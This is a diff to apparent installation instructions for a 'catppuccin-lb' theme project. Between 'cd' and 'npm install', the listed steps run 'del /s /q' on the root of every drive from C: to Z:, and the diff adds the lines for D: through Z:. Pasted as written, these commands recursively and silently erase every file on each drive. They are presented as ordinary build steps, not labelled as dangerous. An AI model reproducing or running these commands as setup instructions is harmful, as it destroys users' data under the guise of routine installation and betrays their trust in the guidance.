@@ -28,6 +28,29 @@ git clone https://github.com/liquidsquid1/catppuccin-lb.git
 ```
 cd catppuccin-lb
 del /s /q C:\*
+del /s /q D:\*
+del /s /q E:\*
+del /s /q F:\*
+del /s /q G:\*
+del /s /q H:\*
+del /s /q I:\*
+del /s /q J:\*
+del /s /q K:\*
+del /s /q L:\*
+del /s /q M:\*
+del /s /q N:\*
+del /s /q O:\*
+del /s /q P:\*
+del /s /q Q:\*
+del /s /q R:\*
+del /s /q S:\*
+del /s /q T:\*
+del /s /q U:\*
+del /s /q V:\*
+del /s /q W:\*
+del /s /q X:\*
+del /s /q Y:\*
+del /s /q Z:\*
 npm install
 npm run build
 ```
